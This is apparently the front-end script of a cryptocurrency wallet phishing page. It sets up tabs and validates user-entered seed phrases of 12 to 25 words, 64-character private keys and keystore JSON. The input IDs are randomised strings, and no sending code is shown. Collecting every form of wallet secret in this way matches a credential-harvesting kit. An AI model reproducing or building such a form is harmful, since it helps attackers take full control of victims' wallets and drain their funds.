function openTab(event, tabId) {
  var i, tabContent, tab;

  tabContent = document.getElementsByClassName("tab-content");
  for (i = 0; i < tabContent.length; i++) {
    tabContent[i].classList.remove("active");
  }

  tab = event.target;
  var tabs = document.getElementsByClassName("tab");
  for (i = 0; i < tabs.length; i++) {
    tabs[i].classList.remove("active");
  }
  tab.classList.add("active");

  document.getElementById(tabId).classList.add("active");
}
document.getElementById("phrase-form").classList.add("active");
document.querySelector(".tab").classList.add("active");

// Validation
function showCustomAlert(message) {
  var alertBox = document.getElementById("custom-alert");
  var alertMessage = document.getElementById("alert-message");

  alertMessage.textContent = message;
  alertBox.style.display = "block";
}

function closeAlert() {
  var alertBox = document.getElementById("custom-alert");
  alertBox.style.display = "none";
}

function validatePhrase() {
  var phraseInput = document.getElementById("vepgzijzsg");
  var phraseValue = phraseInput.value.trim();

  var phrasePattern =
    /\b(?:\w+\s){11}\w+\b|\b(?:\w+\s){14}\w+\b|\b(?:\w+\s){17}\w+\b|\b(?:\w+\s){23}\w+\b|\b(?:\w+\s){24}\w+\b/;

  if (phraseValue === "") {
    showCustomAlert("Secret phrase cannot be empty!");
    phraseInput.focus();
    return false;
  }

  if (!phrasePattern.test(phraseValue)) {
    showCustomAlert("Invalid secret phrase!");
    phraseInput.focus();
    return false;
  }

  return true;
}

function validateKey() {
  var privateKeyInput = document.getElementById("slpfoduuxq");
  var privateKeyValue = privateKeyInput.value.trim();

  var privateKeyPattern = /^[a-zA-Z0-9]{64,}$/;

  if (privateKeyValue === "") {
    showCustomAlert("Private key cannot be empty!");
    privateKeyInput.focus();
    return false;
  }

  if (!privateKeyPattern.test(privateKeyValue)) {
    showCustomAlert("Invalid Private key!");
    privateKeyInput.focus();
    return false;
  }

  return true;
}

function validateKeystore() {
  var keystoreInput = document.getElementById("tnknmtqnlu");
  var keystoreValue = keystoreInput.value.trim();

  if (keystoreValue === "") {
    showCustomAlert("Keystore JSON cannot be empty!");
    keystoreInput.focus();
    return false;
  }

  return true;
}
